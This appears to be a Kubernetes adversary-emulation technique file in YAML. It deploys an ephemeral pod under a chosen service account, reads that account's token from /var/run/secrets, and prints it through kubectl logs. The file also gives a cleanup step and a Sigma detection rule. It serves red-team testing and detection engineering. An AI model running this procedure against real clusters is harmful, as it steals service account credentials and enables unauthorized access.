name: Deploy Container and Mount SA Token
description: Deploy a new ephemeral container, which mounts the service account token of the given name and prints it to stdout
tactic: Credential Access
techniques: ["Steal Application Access Token", "T1528", "Deploy Container"]
parameters:
  ServiceAccount:
    type: string
    default: "${TARGET}"
    required: false
    description: the service account used by the workload
  Name:
    type: string
    description: the name of the resulting workload.
    default: ${POD_NAME}-${RANDOM}
  Namespace:
    type: string
    default: ${NS}
    description: the namespace in which the workload will be deployed
  Image:
    type: string
    default: alpine:latest
    description: the image used by the workload
  Timeout:
    type: int
    default: 30
    description: the timeout (in seconds) for waiting until the pod is created
  Command:
    type: string
    default: /bin/sh -c "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
    description: the command executed when starting the container
procedures:
  - key: kubectl
    command: |+
      echo '{
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {
          "name": "{{.Name}}",
          "namespace": "{{.Namespace}}"
        },
        "spec": {
          "serviceAccountName": "{{.ServiceAccount }}",
          "restartPolicy": "Never",
          "containers": [{
              "name": "{{.Name}}",
              "image": "{{.Image}}",
              "command": ["cat", "/var/run/secrets/kubernetes.io/serviceaccount/token"],
              "securityContext": {
                "allowPrivilegeEscalation": false,
                "capabilities": {"drop": ["ALL"]},
                "readOnlyRootFilesystem": true,
                "runAsNonRoot": true,
                "runAsUser": 1000,
                "seccompProfile": {"type": "RuntimeDefault"}
              }
          }]
        }
      }' | kubectl apply -f -  
      && kubectl wait --for=jsonpath='{.status.containerStatuses[*].state.terminated}' pod/${NAME} --timeout=${TIMEOUT}s 
      && kubectl logs ${NAME}
preconditions:
  rbac: 
    - verb: create
      resource: Pod
effects:
  - rawServiceaccountToken
  - create k8s.Pod
  - k8s.pod.IsRunning=false
  - Namespace($ns)
  - ns.contains($p)
cleanup:
    command: kubectl delete pod ${NAME}
    description: Delete the pod after execution
defense:
  id: D3-PM
  name: Platform Monitoring
  url: https://d3fend.mitre.org/technique/d3f:PlatformMonitoring/
  sigma: 
    title: Create
    status: experimental
    description: Detects creation of a new Pod mounting a specific Service Account
    date: 2025/09/30
    logsource:
      category: application
      product: kubernetes
      service: audit
    detection:
      selection:
        verb: 'create'
        objectRef.resource: 'pods'
        requestObject.spec.serviceAccountName: '*'
      condition: selection
    falsepositives:
      - Legitimate creation of a Pod mounting a specific Service Account
    references:
      - https://www.elastic.co/docs/reference/security/prebuilt-rules/rules/integrations/kubernetes/privilege_escalation_suspicious_assignment_of_controller_service_account
    stp: 5A
    level: low
references:
  - https://microsoft.github.io/Threat-Matrix-for-Kubernetes/techniques/New%20Container/
  - https://kubenomicon.com/Execution/New_container.html
